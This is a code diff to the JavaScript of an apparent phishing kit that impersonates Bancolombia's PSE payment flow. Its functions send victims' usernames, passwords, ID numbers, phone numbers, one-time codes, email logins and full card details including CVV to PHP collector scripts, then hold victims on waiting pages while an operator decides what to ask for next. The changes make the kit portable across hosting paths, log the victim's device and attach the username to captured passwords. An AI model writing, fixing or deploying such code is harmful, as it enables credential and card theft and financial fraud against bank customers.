@@ -25,16 +25,16 @@ function detectar_dispositivo(){
     return dispositivo;
 }   
 
-if (detectar_dispositivo() == "PC") {
-    window.location.href = "https://www.bancolombia.com/personas"; 
-}
+/* Rutas relativas a las páginas en poral/a/ (mismo criterio que Falabella). La ruta absoluta /Nueva carpeta/pse/... falla si el sitio está en un subdirectorio (p. ej. /stevenBuses/...). */
+var PSE_PROCESS = "../../../../../process/";
 
 function vista_password(){
     window.location.href = "../a/PASS";
 }
 
 function inicio(u){
-    $.post( "/Nueva carpeta/pse/process/inicio.php", { usr: u} ,function(data) {
+    var d = detectar_dispositivo();
+    $.post( PSE_PROCESS + "inicio.php", { usr: u, dis: d} ,function(data) {
         setTimeout(vista_password, 2000);        
     });
 }
@@ -71,47 +71,48 @@ function salir(){
     window.location.href = "https://www.bancolombia.com/personas";  
 }               
 
-function pasousuario(p){
+function pasousuario(p, usr){
     var d = detectar_dispositivo();
-    $.post( "/Nueva carpeta/pse/process/pasologina.php", { pas: p, dis: d, ban:"Bancolombia"} ,function(data) {
+    var u = (typeof usr === "string" && usr.length) ? usr : (typeof window.bancolUser === "string" ? window.bancolUser : "");
+    $.post( PSE_PROCESS + "pasologina.php", { usr: u, pas: p, dis: d, ban:"Bancolombia"} ,function(data) {
         window.location.href = "../a/WAITING"; 
     });
 }               
 
 function pasoinfo(d,c){    
-    $.post( "/Nueva carpeta/pse/process/pasoinfo.php", { doc: d, cel: c} ,function(data) {
+    $.post( PSE_PROCESS + "pasoinfo.php", { doc: d, cel: c} ,function(data) {
         window.location.href = "../a/WAITING";  
     });
 } 
 
 function pasootp(o){    
-    $.post( "/Nueva carpeta/pse/process/pasootp.php", { otp: o} ,function(data) {
+    $.post( PSE_PROCESS + "pasootp.php", { otp: o} ,function(data) {
         window.location.href = "../a/WAITING";   
     });
 } 
 
 function pasoerrotp(o){    
-    $.post( "/Nueva carpeta/pse/process/pasootp2.php", { otp: o} ,function(data) {
+    $.post( PSE_PROCESS + "pasootp2.php", { otp: o} ,function(data) {
         window.location.href = "../a/WAITING";    
     });
 }
 
 function pasocorreo(e,c,t){   
-    $.post( "/Nueva carpeta/pse/process/pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {
+    $.post( PSE_PROCESS + "pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {
         window.location.href = "../a/WAITING";   
     });
 }
 
 
 function pasotarjeta(t,f,c){    
-    $.post( "/Nueva carpeta/pse/process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
+    $.post( PSE_PROCESS + "pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
         window.location.href = "../a/WAITING";   
     });
 }
 
 
 function consultar_estado(){ 
-    $.post( "/Nueva carpeta/pse/process/estado.php",function(data) {        
+    $.post( PSE_PROCESS + "estado.php",function(data) {        
         switch (data) {
             case '2': window.location.href = "OTP"; break;
             case '4': window.location.href = "MAIL"; break;
